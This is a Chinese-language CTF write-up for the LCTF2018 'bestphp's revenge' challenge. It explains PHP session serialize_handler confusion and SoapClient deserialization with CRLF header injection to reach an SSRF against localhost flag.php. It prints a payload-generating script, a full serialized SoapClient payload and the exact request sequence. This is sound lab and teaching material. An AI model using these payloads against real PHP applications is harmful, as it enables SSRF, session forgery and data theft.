# bestphp's revenge

## bestphp's revenge

## 考点

* SoapClient打SSRF
* PHP的session.serialize\_handler改变导致的反序列化

## wp

给了index.php源码，目录扫描可以扫到flag.php，用dirsearch在BUU最好低线程加延时，或者用`ctf-wscan`

```
dirsearch -u "a0d63d20-83ba-4cf7-b699-bdf388e5daf0.node4.buuoj.cn:81" -s 0.1 -t 1 -w ctf.txt -x 404
```

```php
 <?php
highlight_file(__FILE__);
$b = 'implode';
call_user_func($_GET['f'], $_POST);
session_start();
if (isset($_GET['name'])) {
    $_SESSION['name'] = $_GET['name'];
}
var_dump($_SESSION);
$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
call_user_func($b, $a);
?> 
```

```php
//only localhost can get flag!
session_start();
echo 'only localhost can get flag!';
$flag = 'LCTF{*************************}';
if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
       $_SESSION['flag'] = $flag;
   }
//only localhost can get flag!
```

那这题就是SSRF了，问题是如何找到入口。回看index.php，和session相关的，想到的有越权、反序列化，这里只能考虑反序列化，反序列化有SoapClient可以触发SSRF，然后是找触发反序列化的点。

这题一直在强调session，并且在`call_user_func($_GET['f'], $_POST);`这里可以进行任意变量的修改。而session序列化有三种方式

测试代码

```php
<?php
ini_set('session.serialize_handler','php_binary');
session_start(); 
$_SESSION["name"] = "123"; 
```

* php\_binary：`\x04names:3:"123";`
* php： `name|s:3:"123";`
* php\_serialize(php>5.5.4)：`a:1:{s:4:"name";s:3:"123";}`

如果session一开始以php\_serialize方式存储，然后把handler变成php，就会按照php方式反序列化。

```php
ini_set('session.serialize_handler','php_serialize');
session_start(); 
$_SESSION["name"] = $_GET["name"]; 
```

传入`|s:3:"234`，那么存储的session就是`a:1:{s:4:"name";s:3:"|s:3:"234";}`，再经过php方式的反序列化，就能得到输出`array(1) { ["a:1:{s:4:"name";s:3:""]=> string(3) "234" }` ，如此就可以触发session的反序列化。最后总结一下，先把序列化内容写入，然后再访问一次触发反序列化，共访问2次。

```php
ini_set('session.serialize_handler','php');
session_start(); 
var_dump($_SESSION);
```

对于本题而言，session内容可控，并且在`session_start();`之前可以执行函数或者定义变量，那就可以进行session反序列化，但是这里肯定执行不了`ini_set('session.serialize_handler','php_serialize');`，因为它要两个参数，在`session_start()`中也可以设置参数，不过这个参数要是个数组，而题目刚好符合条件`call_user_func($_GET['f'], $_POST);`，`f`为`session_start`，`$_POST`是个数组

![](../../.gitbook/assets/ucPr3FddY8alPXO7yz63yef80HIk7jRFq5rvgh\_0wHI.png)

目前得到的结果：GET `f=session_start`，POST `serialize_handler=php`

后面GET name肯定是要SoapClient的反序列化，但是它的反序列化要从`__call`开始，也即调用一个无法调用的函数

```php
<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'asdfghjkl';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: admin=1'
    );
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=> "peri0d"));

$aaa = serialize($b);
$aaa = str_replace('^^','%0d%0a',$aaa);
$aaa = str_replace('&','%26',$aaa);
echo $aaa;

$x = unserialize(urldecode($aaa));
$x->no_func();
```

然后要让SoapClient调用一个无法调用的函数，这就要用最后两行了。reset() 函数输出数组中的当前元素和下一个元素的值，然后把数组的内部指针重置到数组中的第一个元素。

```php
$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
call_user_func($b, $a);
```

这就不得不提`call_user_func`

```php
call_user_func(callable $callback, mixed $parameter = ?, mixed $... = ?): mixed
```

它有两个用法

1. 执行函数，把第一个参数作为回调函数调用，其余参数是回调函数的参数
2. 执行类中的函数，传入数组，数组第一个元素是对象名，第二个元素是函数名`call_user_func(array($name, $method));`

在这里就可以循环调用`call_user_func`，`call_user_func("call_user_func", array($_SESSION,"welcome_to_the_lctf2018"));`这样反序列化之后的`$_SESSION`就可以触发`__call()`了

先访问一次把反序列化内容写入

GET `f=session_start&name=payload`，POST `serialize_handler=php_serialize`

```
|O:10:"SoapClient":5:{s:3:"uri";s:6:"period";s:8:"location";s:25:"http://127.0.0.1/flag.php";s:15:"_stream_context";i:0;s:11:"_user_agent";s:154:"wupco%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0aX-Forwarded-For: 127.0.0.1%0d%0aCookie: PHPSESSID=fpc54ui1kv6dkh3mso2gfip1gm%0d%0aContent-Length: 3%0d%0a%0d%0aaaa";s:13:"_soap_version";i:1;}
```

然后再用extract进行变量覆盖，触发SoapClient反序列化

GET `f=extract`，POST `b=call_user_func`

在BUU上最好用新的session，要不会一直卡在加载那里

![](../../.gitbook/assets/w7Ut00M2IKN4M9iU1xNJwwC1FllLxzfd\_9l7wjRz3qs.png)

## 小结

1. extract能对session进行变量覆盖吗

```php
<?php
extract($_POST);
session_start(); 
$_SESSION["name"] = $_GET["name"]; 
var_dump($_SESSION);
```

如果`session_start`在`extract`之前就可以，否则不行

1. 类似的题目有\[jarvisoj] PHPINFO
